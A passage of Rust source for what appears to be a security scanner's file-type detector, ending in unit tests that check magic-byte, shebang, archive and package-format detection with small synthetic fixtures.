        "requirements.txt" => Some(FileType::RequirementsTxt),
        "poetry.lock" => Some(FileType::PoetryLock),
        "pipfile.lock" => Some(FileType::PipfileLock),
        "gemfile.lock" => Some(FileType::GemfileLock),
        "composer.lock" => Some(FileType::ComposerLock),
        "yarn.lock" => Some(FileType::YarnLock),
        "pnpm-lock.yaml" => Some(FileType::PnpmLock),
        "manifest.json" => {
            // Chrome extension: manifest_version + at least one Chrome-specific key
            if memchr::memmem::find(data, b"\"manifest_version\"").is_some()
                && (memchr::memmem::find(data, b"\"permissions\"").is_some()
                    || memchr::memmem::find(data, b"\"content_scripts\"").is_some()
                    || memchr::memmem::find(data, b"\"background\"").is_some()
                    || memchr::memmem::find(data, b"\"host_permissions\"").is_some())
            {
                Some(FileType::ChromeManifest)
            } else {
                None
            }
        }
        "extension.vsixmanifest" => Some(FileType::VsixManifest),
        ".pkginfo" | ".buildinfo" | ".mtree" => Some(FileType::Text),
        "pkg-info" | "metadata" => Some(FileType::PkgInfo),
        "action.yml" | "action.yaml" => Some(FileType::GithubActions),
        _ => {
            if name.ends_with(".vsixmanifest") {
                Some(FileType::VsixManifest)
            } else if name.starts_with("yarn.") && name.ends_with(".lock") {
                Some(FileType::YarnLock)
            } else {
                None
            }
        }
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {

    fn is_svg(data: &[u8]) -> bool {
        detect_xml(data).map(|(ft, _)| ft) == Some(FileType::Svg)
    }

    #[test]
    fn svg_root_needs_a_doctype_that_names_svg() {
        // The `<!DOCTYPE …>` allowance exists for `<!DOCTYPE svg PUBLIC …>`.
        // Accepting any doctype and then hunting for `<svg` in the first
        // kilobyte typed every HTML page with an inline icon as an image,
        // which skipped every HTML rule for it.
        assert!(is_svg(
            b"<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"x\">\n<svg xmlns=\"x\"/>"
        ));
        assert!(!is_svg(b"<!DOCTYPE html>\n<svg xmlns=\"x\"></svg>"));
        // A `<?xml` prolog is still a legitimate preamble for a real SVG.
        assert!(is_svg(b"<?xml version=\"1.0\"?>\n<svg xmlns=\"x\"/>"));
    }

    #[test]
    fn svg_root_yields_to_an_enclosing_html_element() {
        // XHTML reaches the prolog branch, so the doctype check alone does
        // not settle it. An `<html>` ahead of the `<svg>` does.
        assert!(!is_svg(
            b"<?xml version=\"1.0\"?>\n<html xmlns=\"x\"><body><svg width=\"9\"></svg>"
        ));
        assert!(!is_svg(b"<!DOCTYPE svg><html><svg ></svg>"));
    }

    #[test]
    fn svg_root_ignores_a_document_with_no_svg_at_all() {
        assert!(!is_svg(b"<?xml version=\"1.0\"?>\n<rss version=\"2.0\">"));
        assert!(!is_svg(b"plain text"));
    }
    use super::*;

    #[test]
    fn elf_magic() {
        let data = b"\x7fELF\x02\x01\x01\x00";
        let (ft, src) = detect_from_content(Path::new("a.out"), data).unwrap();
        assert_eq!(ft, FileType::Elf);
        assert_eq!(src, DetectionSource::Magic);
    }

    #[test]
    fn pe_magic() {
        let data = b"MZ\x90\x00\x03\x00\x00\x00";
        let (ft, _) = detect_from_content(Path::new("app.exe"), data).unwrap();
        assert_eq!(ft, FileType::Pe);
    }

    #[test]
    fn macho_64() {
        let data = [0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0];
        let (ft, _) = detect_from_content(Path::new("binary"), &data).unwrap();
        assert_eq!(ft, FileType::MachO);
    }

    #[test]
    fn java_class_vs_macho_fat() {
        let java = [0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 52];
        let (ft, _) = detect_from_content(Path::new("Main.class"), &java).unwrap();
        assert_eq!(ft, FileType::JavaClass);

        let macho = [0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x02];
        let (ft, _) = detect_from_content(Path::new("universal"), &macho).unwrap();
        assert_eq!(ft, FileType::MachO);
    }

    /// Junk file shaped like CAFEBABE whose `major_version` falls
    /// outside the Java range AND whose `nfat_arch` is implausibly
    /// large. Pre-fix, this classified as Mach-O and the fat parser
    /// then sliced with a multi-gigabyte start offset → panic. We now
    /// treat it as a Java class so the lenient class parser handles
    /// it (and bails cleanly when the body doesn't match).
    #[test]
    fn cafebabe_with_implausible_nfat_arch_falls_back_to_java() {
        // bytes[4..8] = 0x4D 0x11 0xAB 0xD4 — nfat_arch ≈ 1.29 billion
        // and major_version = 0xABD4 (44_000), both outside their
        // respective sane ranges.
        let junk = [0xCA, 0xFE, 0xBA, 0xBE, 0x4D, 0x11, 0xAB, 0xD4];
        let (ft, _) = detect_from_content(Path::new("anon.class"), &junk).unwrap();
        assert_eq!(ft, FileType::JavaClass);
    }

    #[test]
    fn shebang_bash() {
        let data = b"#!/bin/bash\necho hello\n";
        let (ft, src) = detect_from_content(Path::new("script"), data).unwrap();
        assert_eq!(ft, FileType::Shell);
        assert_eq!(src, DetectionSource::Shebang);
    }

    #[test]
    fn shebang_python() {
        let data = b"#!/usr/bin/env python3\nimport sys\n";
        let (ft, src) = detect_from_content(Path::new("tool"), data).unwrap();
        assert_eq!(ft, FileType::Python);
        assert_eq!(src, DetectionSource::Shebang);
    }

    #[test]
    fn shebang_env_with_flags() {
        let data = b"#!/usr/bin/env python3 -u\nimport sys\n";
        let (ft, _) = detect_from_content(Path::new("tool"), data).unwrap();
        assert_eq!(ft, FileType::Python);
    }

    #[test]
    fn shebang_direct_path() {
        let data = b"#!/usr/local/bin/perl\nuse strict;\n";
        let (ft, _) = detect_from_content(Path::new("script"), data).unwrap();
        assert_eq!(ft, FileType::Perl);
    }

    #[test]
    fn shebang_node() {
        let data = b"#!/usr/bin/env node\nconsole.log('hi');\n";
        let (ft, _) = detect_from_content(Path::new("script"), data).unwrap();
        assert_eq!(ft, FileType::JavaScript);
    }

    /// Shebang lines that named their interpreter but were left untyped, so
    /// every language-gated rule skipped the script.
    #[test]
    fn shebang_variants() {
        let cases: &[(&[u8], FileType)] = &[
            // CRLF line endings: the `\r` is not part of the interpreter name.
            (b"#!/usr/bin/perl\r\nuse Socket;\r\n", FileType::Perl),
            (b"#!/bin/bash\r\necho hi\r\n", FileType::Shell),
            (b"#!/usr/bin/env python3\r\nimport os\r\n", FileType::Python),
            (
                b"\xEF\xBB\xBF#!/usr/bin/perl\r\nuse Socket;\r\n",
                FileType::Perl,
            ),
            (b"\xEF\xBB\xBF#!/bin/bash\r\necho hi\r\n", FileType::Shell),
            // A `/` in an argument is not the interpreter path.
            (b"#!/usr/bin/perl -I/opt/lib\nuse Socket;\n", FileType::Perl),
            (b"#!/bin/bash --rcfile /etc/x\necho hi\n", FileType::Shell),
            // env is found by basename, after whitespace, with its options.
            (b"#!/usr/local/bin/env perl\n", FileType::Perl),
            (b"#!/bin/env ruby\n", FileType::Ruby),
            (b"#! /usr/bin/env perl\n", FileType::Perl),
            (b"#!/usr/bin/env -S perl -w\n", FileType::Perl),
            (b"#!/usr/bin/env -u HOME LANG=C perl\n", FileType::Perl),
            (b"#!/bin/busybox sh\n", FileType::Shell),
            // Versioned interpreter names.
            (b"#!/usr/bin/perl5.36\n", FileType::Perl),
            (b"#!/usr/bin/python3.11\n", FileType::Python),
            (b"#!/usr/bin/ksh93\n", FileType::Shell),
            // Interpreters for types that already existed.
            (b"#!/usr/bin/env pwsh\n", FileType::PowerShell),
            (
                b"#!/usr/bin/osascript\ndo shell script \"id\"\n",
                FileType::AppleScript,
            ),
            (
                b"#!/usr/bin/osascript -l JavaScript\nApplication('Finder')\n",
                FileType::JavaScript,
            ),
        ];
        for (data, want) in cases {
            let got = detect_from_content(Path::new("script"), data);
            assert_eq!(
                got,
                Some((*want, DetectionSource::Shebang)),
                "{}",
                String::from_utf8_lossy(data).escape_debug()
            );
        }
    }

    #[test]
    fn shebang_without_interpreter() {
        for data in [
            &b"#!\n"[..],
            b"#! \r\n",
            b"#!/usr/bin/env\n",
            b"#!/usr/bin/env -S\n",
            b"#!/opt/x/unknown\n",
        ] {
            assert_eq!(
                detect_shebang(data),
                None,
                "{}",
                String::from_utf8_lossy(data).escape_debug()
            );
        }
    }

    #[test]
    fn png_magic() {
        let data = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR";
        let (ft, _) = detect_from_content(Path::new("image.png"), data).unwrap();
        assert_eq!(ft, FileType::Png);
    }

    #[test]
    fn jpeg_magic() {
        let data = [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10];
        let (ft, _) = detect_from_content(Path::new("photo.jpg"), &data).unwrap();
        assert_eq!(ft, FileType::Jpeg);
    }

    #[test]
    fn ole2_magic() {
        let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
        data.extend_from_slice(&[0; 100]);
        let (ft, _) = detect_from_content(Path::new("doc.doc"), &data).unwrap();
        assert_eq!(ft, FileType::OleDoc);
        let (ft, _) = detect_from_content(Path::new("setup.msi"), &data).unwrap();
        assert_eq!(ft, FileType::Msi);
        let (ft, _) = detect_from_content(Path::new("patch.msp"), &data).unwrap();
        assert_eq!(ft, FileType::Msi);
        let (ft, _) = detect_from_content(Path::new("custom.mst"), &data).unwrap();
        assert_eq!(ft, FileType::Msi);
    }

    #[test]
    fn plist_xml() {
        let data = b"<?xml version=\"1.0\"?>\n<!DOCTYPE plist PUBLIC>";
        let (ft, _) = detect_from_content(Path::new("Info.plist"), data).unwrap();
        assert_eq!(ft, FileType::Plist);
    }

    #[test]
    fn nib_archive() {
        let data = b"NIBArchive\x01\x00\x00\x00\x0a\x00\x00\x00";
        let (ft, src) = detect_from_content(Path::new("MainMenu.nib"), data).unwrap();
        assert_eq!(ft, FileType::Nib);
        assert_eq!(src, DetectionSource::Magic);
        // The magic alone identifies it; the name is not consulted.
        let (ft, _) = detect_from_content(Path::new("payload.bin"), data).unwrap();
        assert_eq!(ft, FileType::Nib);
    }

    #[test]
    fn nib_keyed_archive_types_as_plist() {
        // A keyed-archive nib (NSKeyedArchiver bplist inside an older nib
        // bundle) is still a plain property list on disk, regardless of the
        // `.nib` extension -- type it Plist so plist-aware rules can address
        // it. Only the distinct NIBArchive binary format keeps FileType::Nib.
        let data = b"bplist00\x00\x00\x00\x00";
        let (ft, _) = detect_from_content(Path::new("keyedobjects.nib"), data).unwrap();
        assert_eq!(ft, FileType::Plist);
        let (ft, _) = detect_from_content(Path::new("Objects.NIB"), data).unwrap();
        assert_eq!(ft, FileType::Plist);
        let (ft, _) = detect_from_content(Path::new("prefs"), data).unwrap();
        assert_eq!(ft, FileType::Plist);
    }

    #[test]
    fn plist_binary() {
        let data = b"bplist00\x00\x00\x00\x00";
        let (ft, _) = detect_from_content(Path::new("prefs"), data).unwrap();
        assert_eq!(ft, FileType::Plist);
    }

    #[test]
    fn rar_archive() {
        let data = b"Rar!\x1a\x07\x01\x00";
        let (ft, _) = detect_from_content(Path::new("archive.rar"), data).unwrap();
        assert_eq!(ft, FileType::Rar);
    }

    /// Build a Unix `ar` archive from `(member_name, data)` pairs.
    fn ar_archive(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut out = b"!<arch>\n".to_vec();
        for (name, data) in members {
            let header = format!(
                "{:<16}{:<12}{:<6}{:<6}{:<8}{:<10}",
                name,
                "0",
                "0",
                "0",
                "100644",
                data.len()
            );
            out.extend_from_slice(header.as_bytes());
            out.extend_from_slice(b"`\n");
            out.extend_from_slice(data);
            if data.len() % 2 == 1 {
                out.push(b'\n'); // members are 2-byte aligned
            }
        }
        out
    }

    #[test]
    fn ar_debian_binary_is_deb() {
        // A `.deb` always leads with the `debian-binary` member. Detect by
        // magic alone (extensionless path) to exercise the member peek.
        let deb = ar_archive(&[("debian-binary", b"2.0\n"), ("control.tar.gz", b"xx")]);
        let (ft, _) = detect_from_content(Path::new("mystery"), &deb).unwrap();
        assert_eq!(ft, FileType::Deb);

        // GNU `ar` slash-terminates member names; still a Deb.
        let deb_slash = ar_archive(&[("debian-binary/", b"2.0\n")]);
        let (ft, _) = detect_from_content(Path::new("mystery"), &deb_slash).unwrap();
        assert_eq!(ft, FileType::Deb);
    }

    #[test]
    fn ar_static_library_is_not_deb() {
        // A static library (.a) leads with a symbol table (`/`) or an object
        // member — never `debian-binary`. It must NOT be mis-typed as `Deb`
        // (which sent libcurl.a et al. down the Debian-package extractor and
        // exposed their object bytes to archive-family content rules).
        let lib = ar_archive(&[("/", b"symtab.."), ("curl_ftp.o/", b"\x7fELF....")]);
        let (ft, _) = detect_from_content(Path::new("mystery"), &lib).unwrap();
        assert_eq!(ft, FileType::StaticLib);
    }

    #[test]
    fn gzip_plain() {
        let data = [0x1f, 0x8b, 0x08, 0x00];
        let (ft, _) = detect_from_content(Path::new("data.gz"), &data).unwrap();
        assert_eq!(ft, FileType::Gz);
    }

    #[test]
    fn gzip_tar() {
        let data = [0x1f, 0x8b, 0x08, 0x00];
        let (ft, _) = detect_from_content(Path::new("data.tar.gz"), &data).unwrap();
        assert_eq!(ft, FileType::TarGz);
    }

    #[test]
    fn zip_archive() {
        let data = b"PK\x03\x04some content here";
        let (ft, _) = detect_from_content(Path::new("data.zip"), data).unwrap();
        assert_eq!(ft, FileType::Zip);
    }

    #[test]
    fn cab_archive() {
        let data = b"MSCF\x00\x00\x00\x00cabinet content";
        let (ft, _) = detect_from_content(Path::new("archive.cab"), data).unwrap();
        assert_eq!(ft, FileType::Cab);
    }

    #[test]
    fn dex_bytecode() {
        let data = b"dex\n035\0payload";
        let (ft, _) = detect_from_content(Path::new("classes.dex"), data).unwrap();
        assert_eq!(ft, FileType::Dex);
    }

    #[test]
    fn jar_detected_as_jar() {
        let data = b"PK\x03\x04jar content here";
        let (ft, _) = detect_from_content(Path::new("lib.jar"), data).unwrap();
        assert_eq!(ft, FileType::Jar);
    }

    #[test]
    fn apk_android_is_zip() {
        // `.apk` + ZIP magic → Android package (never the Alpine gzip form).
        let data = b"PK\x03\x04android apk content";
        let (ft, _) = detect_from_content(Path::new("app.apk"), data).unwrap();
        assert_eq!(ft, FileType::ApkAndroid);
    }

    #[test]
    fn apk_alpine_is_gzip_tar() {
        // `.apk` + gzip magic → Alpine package, disambiguated from Android by
        // container magic alone (no member peek).
        let data = [0x1f, 0x8b, 0x08, 0x00];
        let (ft, _) = detect_from_content(Path::new("musl-1.2.4.apk"), &data).unwrap();
        assert_eq!(ft, FileType::ApkAlpine);
    }

    #[test]
    fn macos_pkg_is_xar() {
        let data = b"xar!\x00\x1c\x00\x01";
        let (ft, _) = detect_from_content(Path::new("installer.pkg"), data).unwrap();
        assert_eq!(ft, FileType::PkgMacos);
    }

    #[test]
    fn ooxml_by_extension() {
        // With the OPC marker the extension is believed; without it the file
        // is what it is, which is a zip.
        let data = b"PK\x03\x04[Content_Types].xml";
        let (ft, _) = detect_from_content(Path::new("report.docx"), data).unwrap();
        assert_eq!(ft, FileType::Ooxml);
        let plain = b"PK\x03\x04some office content";
        let (ft, _) = detect_from_content(Path::new("report.docx"), plain).unwrap();
        assert_eq!(ft, FileType::Zip);
    }

    #[test]
    fn ooxml_by_content_types() {
        let mut data = b"PK\x03\x04".to_vec();
        data.extend_from_slice(b"[Content_Types].xml");
        let (ft, _) = detect_from_content(Path::new("report.txt"), &data).unwrap();
        assert_eq!(ft, FileType::Ooxml);
    }

    #[test]
    fn vsix_by_manifest_without_extension() {
        let mut data = b"PK\x03\x04".to_vec();
        data.extend_from_slice(b"extension.vsixmanifest\0[Content_Types].xml");
        let (ft, _) = detect_from_content(Path::new("artifact.sample"), &data).unwrap();
        assert_eq!(ft, FileType::Vsix);
    }

    #[test]
    fn php_opening_tag() {
        let data = b"<?php\necho 'hello';\n";
        let (ft, _) = detect_from_content(Path::new("page"), data).unwrap();
        assert_eq!(ft, FileType::Php);
    }

    #[test]
    fn tampered_pe() {
        let mut data = vec![0x00; 256];
        data[5] = b'M';
        data[6] = b'Z';
        let e_lfanew: u32 = 0x80;
        data[5 + 0x3C] = (e_lfanew & 0xFF) as u8;
        data[5 + 0x3D] = 0;
        data[5 + 0x3E] = 0;
        data[5 + 0x3F] = 0;
        let pe_sig_offset = 5 + e_lfanew as usize;
        if pe_sig_offset + 4 <= data.len() {
            data[pe_sig_offset] = b'P';
            data[pe_sig_offset + 1] = b'E';
            data[pe_sig_offset + 2] = 0;
            data[pe_sig_offset + 3] = 0;
        }
        let (ft, _) = detect_from_content(Path::new("suspicious"), &data).unwrap();
        assert_eq!(ft, FileType::Pe);
    }

    #[test]
    fn chrome_manifest() {
        let data = br#"{"manifest_version": 3, "permissions": ["storage"]}"#;
        let (ft, _) = detect_from_content(Path::new("manifest.json"), data).unwrap();
        assert_eq!(ft, FileType::ChromeManifest);
    }

    #[test]
    fn lnk_magic() {
        let mut data = LNK_MAGIC.to_vec();
        data.extend_from_slice(&[0; 100]);
        let (ft, _) = detect_from_content(Path::new("shortcut.lnk"), &data).unwrap();
        assert_eq!(ft, FileType::Lnk);
    }

    #[test]
    fn python_bytecode() {
        let data = [0x42, 0x0D, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00];
        let (ft, _) = detect_from_content(Path::new("module.pyc"), &data).unwrap();
        assert_eq!(ft, FileType::PythonBytecode);
    }

    #[test]
    fn beam_bytecode() {
        // IFF container: `FOR1` <u32 size> `BEAM`
        let data = *b"FOR1\x00\x00\x40\x08BEAMAtU8";
        let (ft, src) = detect_from_content(Path::new("gb_trees.beam"), &data).unwrap();
        assert_eq!(ft, FileType::Beam);
        assert_eq!(src, DetectionSource::Magic);
    }

    #[test]
    fn for1_without_beam_is_not_beam() {
        // `FOR1` IFF header for a non-BEAM form (e.g. AIFF would be `FORM`) must not match.
        let data = *b"FOR1\x00\x00\x00\x08AIFFxxxx";
        assert!(detect_from_content(Path::new("x"), &data).is_none());
    }

    #[test]
    fn zstd_archive() {
        let data = [0x28, 0xB5, 0x2F, 0xFD, 0x00, 0x00];
        let (ft, _) = detect_from_content(Path::new("data.zst"), &data).unwrap();
        assert_eq!(ft, FileType::Zst);
    }

    #[test]
    fn freebsd_pkg_zstd_archive() {
        let data = {
            let mut tar = tar::Builder::new(Vec::new());
            let mut h = tar::Header::new_ustar();
            h.set_path("+COMPACT_MANIFEST").unwrap();
            h.set_size(7);
            h.set_cksum();
            tar.append(&h, &b"payload"[..]).unwrap();
            zstd::encode_all(&tar.into_inner().unwrap()[..], 3).unwrap()
        };
        let (ft, _) = detect_from_content(Path::new("BerkeleyGW-4.0_2.pkg"), &data).unwrap();
        assert_eq!(ft, FileType::PkgFreebsd);
    }

    /// Build a gzip-compressed tar from `(path, body)` members.
    fn build_gzip_tar(members: &[(&str, &[u8])]) -> Vec<u8> {
        use std::io::Write;
        let mut tar = Vec::new();
        {
            let mut b = tar::Builder::new(&mut tar);
            for (path, body) in members {
                let mut h = tar::Header::new_ustar();
                h.set_path(path).unwrap();
                h.set_size(body.len() as u64);
                h.set_cksum();
                b.append(&h, &body[..]).unwrap();
            }
            b.finish().unwrap();
        }
        let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        e.write_all(&tar).unwrap();
        e.finish().unwrap()
    }

    /// Build an uncompressed tar from `(path, body)` members.
    fn build_plain_tar(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut tar = Vec::new();
        {
            let mut b = tar::Builder::new(&mut tar);
            for (path, body) in members {
                let mut h = tar::Header::new_ustar();
                h.set_path(path).unwrap();
                h.set_size(body.len() as u64);
                h.set_cksum();
                b.append(&h, &body[..]).unwrap();
            }
            b.finish().unwrap();
        }
        tar
    }

    #[test]
    fn python_sdist_detected_by_pkg_info() {
        let gz = build_gzip_tar(&[
            ("requests-2.31.0/setup.py", b"setup()"),
            ("requests-2.31.0/requests/__init__.py", b"# pkg"),
            ("requests-2.31.0/PKG-INFO", b"Name: requests\n"),
        ]);
        let (ft, _) = detect_from_content(Path::new("requests-2.31.0.tar.gz"), &gz).unwrap();
        assert_eq!(ft, FileType::PythonSdist);

        // A single-rooted gzip tar without PKG-INFO stays a generic tar.gz.
        let plain = build_gzip_tar(&[("proj-1.0/README", b"hi"), ("proj-1.0/main.c", b"int")]);
        let (ft, _) = detect_from_content(Path::new("proj-1.0.tar.gz"), &plain).unwrap();
        assert_eq!(ft, FileType::TarGz);
    }

    #[test]
    fn python_sdist_pkg_info_may_follow_large_source_tree() {
        let padding = vec![0u8; (8 << 20) + 1];
        let gz = build_gzip_tar(&[
            ("generated-1.0/src/generated/client.py", &padding),
            ("generated-1.0/PKG-INFO", b"Name: generated\n"),
        ]);
        let (ft, _) = detect_from_content(Path::new("content-addressed.sample"), &gz).unwrap();
        assert_eq!(ft, FileType::PythonSdist);
    }

    #[test]
    fn arch_pkg_non_zstd_by_extension() {
        // The `.pkg.tar.{xz,gz}` extension is Arch-specific; content can't always
        // be read (no xz decompressor), so the extension is authoritative.
        let gz = build_gzip_tar(&[
            (".PKGINFO", b"pkgname = foo\n"),
            ("usr/bin/foo", b"\x7fELF"),
        ]);
        let (ft, _) = detect_from_content(Path::new("foo-1.0-1-x86_64.pkg.tar.gz"), &gz).unwrap();
        assert_eq!(ft, FileType::PkgArch);

        let xz = b"\xfd7zXZ\x00\x00\x00rest-of-stream";
        let (ft, _) = detect_from_content(Path::new("foo-1.0-1-x86_64.pkg.tar.xz"), xz).unwrap();
        assert_eq!(ft, FileType::PkgArch);
    }

    #[test]
    fn oci_layout_and_docker_save_detected() {
        // OCI image layout: oci-layout + index.json.
        let oci = build_plain_tar(&[
            ("oci-layout", br#"{"imageLayoutVersion":"1.0.0"}"#),
            ("index.json", br#"{"manifests":[]}"#),
            ("blobs/sha256/abc", b"blob"),
        ]);
        let (ft, _) = detect_from_content(Path::new("image.tar"), &oci).unwrap();
        assert_eq!(ft, FileType::OciImage);

        // docker save bundle: manifest.json + a layer tar.
        let docker = build_plain_tar(&[
            ("deadbeef/layer.tar", b"layer"),
            ("config.json", b"{}"),
            ("manifest.json", br#"[{"RepoTags":["x:1"]}]"#),
        ]);
        let (ft, _) = detect_from_content(Path::new("saved.tar"), &docker).unwrap();
        assert_eq!(ft, FileType::OciImage);

        // A plain tar with neither marker pair is a generic tar. This used to
        // assert `is_none()` -- the ustar branch bailed and Stage 4 recovered
        // the type from the `.tar` extension. The resulting FileType was the
        // same; only the DetectionSource differed. Asserting the type keeps
        // the guarantee that actually matters (an OCI bundle is not a plain
        // tar) without pinning the stage that supplies it.
        let plain = build_plain_tar(&[("README", b"hi"), ("src/main.rs", b"fn main(){}")]);
        let (ft, _) = detect_from_content(Path::new("plain.tar"), &plain).unwrap();
        assert_eq!(ft, FileType::Tar);
    }

    #[test]
    fn ustar_tar_detected_regardless_of_extension() {
        // The ustar signature at offset 257 identifies a tar on its own, so a
        // tar is walked whatever it is named. Previously only `.tar` was
        // recognized and the same bytes under any other extension were typed
        // Data and never descended into -- an XMRig release tarball named
        // `<sha256>.bin` produced one finding instead of six.
        let plain = build_plain_tar(&[("README", b"hi"), ("src/main.rs", b"fn main(){}")]);
        for name in ["payload.bin", "image.png", "noextension"] {
            let (ft, src) = detect_from_content(Path::new(name), &plain)
                .unwrap_or_else(|| panic!("{name} was not detected as a tar"));
            assert_eq!(ft, FileType::Tar, "{name}");
            assert_eq!(src, DetectionSource::Magic, "{name}");
        }

        // `.gem` is also an uncompressed ustar tar and has no magic of its
        // own, so the extension must keep naming it.
        assert!(!matches!(
            detect_from_content(Path::new("rails.gem"), &plain),
            Some((FileType::Tar, _))
        ));
    }

    #[test]
    fn pkg_zstd_without_manifest_is_not_freebsd() {
        // A `.pkg`-named zstd stream whose leading bytes aren't the FreeBSD
        // manifest marker must not be claimed as a FreeBSD package.
        let data = zstd::encode_all(&b"usr/local/bin/whatever\0payload"[..], 3).unwrap();
        let (ft, _) = detect_from_content(Path::new("notpkg.pkg"), &data).unwrap();
        assert_eq!(ft, FileType::Zst);
    }

    #[test]
    fn crate_is_gzip_tar() {
        // `.crate` is cargo-specific; gzip magic + extension suffices.
        let data = [0x1f, 0x8b, 0x08, 0x00];
        let (ft, _) = detect_from_content(Path::new("serde-1.0.0.crate"), &data).unwrap();
        assert_eq!(ft, FileType::Crate);
    }

    #[test]
    fn npm_tgz_detected_by_package_prefix() {
        // npm tarballs put everything under `package/`; build a real gzip tar
        // so the marker peek runs.
        let mut tar = Vec::new();
        {
            let mut b = tar::Builder::new(&mut tar);
            // macOS `tar` smuggles an AppleDouble `._package` sidecar in as the
            // first entry; the peek must skip it rather than bail.
            let mut sidecar = tar::Header::new_ustar();
            sidecar.set_path("._package").unwrap();
            sidecar.set_size(0);
            sidecar.set_cksum();
            b.append(&sidecar, std::io::empty()).unwrap();
            // Real `tar` emits the `package/` directory entry first; the peek
            // must tolerate it (its path arrives without the trailing slash).
            let mut dir = tar::Header::new_ustar();
            dir.set_path("package/").unwrap();
            dir.set_size(0);
            dir.set_entry_type(tar::EntryType::Directory);
            dir.set_cksum();
            b.append(&dir, std::io::empty()).unwrap();
            let body = br#"{"name":"demo","version":"1.0.0"}"#;
            let mut h = tar::Header::new_ustar();
            h.set_path("package/package.json").unwrap();
            h.set_size(body.len() as u64);
            h.set_cksum();
            b.append(&h, &body[..]).unwrap();
            b.finish().unwrap();
        }
        let gz = {
            use std::io::Write;
            let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
            e.write_all(&tar).unwrap();
            e.finish().unwrap()
        };
        let (ft, _) = detect_from_content(Path::new("demo-1.0.0.tgz"), &gz).unwrap();
        assert_eq!(ft, FileType::Npm);

        // A `.tgz` without the `package/` layout stays a generic gzip tar.
        let plain = build_gzip_tar(&[("README", b"hi"), ("src/main.c", b"int")]);
        let (ft, _) = detect_from_content(Path::new("blob.tgz"), &plain).unwrap();
        assert_eq!(ft, FileType::TarGz);

        // One that decodes to something other than a tar is a plain gzip,
        // whatever it is called: the content has spoken.
        let not_tar = {
            use std::io::Write;
            let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
            e.write_all(b"not a tar").unwrap();
            e.finish().unwrap()
        };
        let (ft, _) = detect_from_content(Path::new("blob.tgz"), &not_tar).unwrap();
        assert_eq!(ft, FileType::Gz);
    }

    #[test]
    fn npm_tgz_with_manifest_after_source_tree() {
        // Some packers order `package/package.json` after the whole source
        // tree instead of near the front. Detection must still scan past those
        // entries rather than give up on a fixed member budget.
        let mut tar = Vec::new();
        {
            let mut b = tar::Builder::new(&mut tar);
            for i in 0..40 {
                let body = b"// source\n";
                let mut h = tar::Header::new_ustar();
                h.set_path(format!("package/lib/file{i}.js")).unwrap();
                h.set_size(body.len() as u64);
                h.set_cksum();
                b.append(&h, &body[..]).unwrap();
            }
            let body = br#"{"name":"demo","version":"1.0.0"}"#;
            let mut h = tar::Header::new_ustar();
            h.set_path("package/package.json").unwrap();
            h.set_size(body.len() as u64);
            h.set_cksum();
            b.append(&h, &body[..]).unwrap();
            b.finish().unwrap();
        }
        let gz = {
            use std::io::Write;
            let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
            e.write_all(&tar).unwrap();
            e.finish().unwrap()
        };
        let (ft, _) = detect_from_content(Path::new("demo-1.0.0.tgz"), &gz).unwrap();
        assert_eq!(ft, FileType::Npm);
    }

    #[test]
    fn package_layout_without_manifest_stays_targz() {
        // Everything under `package/` but no `package/package.json` is not a
        // valid npm package — it must fall back to a generic gzip tar rather
        // than being mislabeled npm.
        let mut tar = Vec::new();
        {
            let mut b = tar::Builder::new(&mut tar);
            let body = b"data";
            let mut h = tar::Header::new_ustar();
            h.set_path("package/readme.txt").unwrap();
            h.set_size(body.len() as u64);
            h.set_cksum();
            b.append(&h, &body[..]).unwrap();
            b.finish().unwrap();
        }
        let gz = {
            use std::io::Write;
            let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
            e.write_all(&tar).unwrap();
            e.finish().unwrap()
        };
        let (ft, _) = detect_from_content(Path::new("blob.tgz"), &gz).unwrap();
        assert_eq!(ft, FileType::TarGz);
    }

    #[test]
    fn arch_pkg_detected_by_pkginfo() {
        let mut tar = Vec::new();
        {
            let mut b = tar::Builder::new(&mut tar);
            let body = b"pkgname = demo\n";
            let mut h = tar::Header::new_ustar();
            h.set_path(".PKGINFO").unwrap();
            h.set_size(body.len() as u64);
            h.set_cksum();
            b.append(&h, &body[..]).unwrap();
            b.finish().unwrap();
        }
        let zst = zstd::encode_all(&tar[..], 3).unwrap();
        let (ft, _) =
            detect_from_content(Path::new("demo-1.0-1-x86_64.pkg.tar.zst"), &zst).unwrap();
        assert_eq!(ft, FileType::PkgArch);
    }

    /// Build a zip local-header chain from (name, stored-data) pairs.
    fn zip_of(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        for (name, body) in entries {
            out.extend_from_slice(b"PK\x03\x04");
            out.extend_from_slice(&[0u8; 14]); // version..crc
            out.extend_from_slice(&(body.len() as u32).to_le_bytes()); // compressed
            out.extend_from_slice(&(body.len() as u32).to_le_bytes()); // uncompressed
            out.extend_from_slice(&(name.len() as u16).to_le_bytes());
            out.extend_from_slice(&0u16.to_le_bytes()); // extra
            out.extend_from_slice(name.as_bytes());
            out.extend_from_slice(body);
        }
        out.extend_from_slice(b"PK\x01\x02");
        out
    }

    #[test]
    fn a_data_descriptor_chain_is_still_walkable() {
        // Android's packager writes entries with general-purpose bit 3 set
        // and the sizes present in the local header anyway, followed by a
        // PK\x07\x08 descriptor record. Treating that record as the end of
        // the chain made every such zip unwalkable -- which is how a 21 MB
        // APK fell through to a substring match and was called an Office
        // document.
        let mut zip = Vec::new();
        for (name, body) in [
            ("META-INF/MANIFEST.MF", b"Manifest".as_slice()),
            ("AndroidManifest.xml", b"\x03\x00"),
        ] {
            zip.extend_from_slice(b"PK\x03\x04");
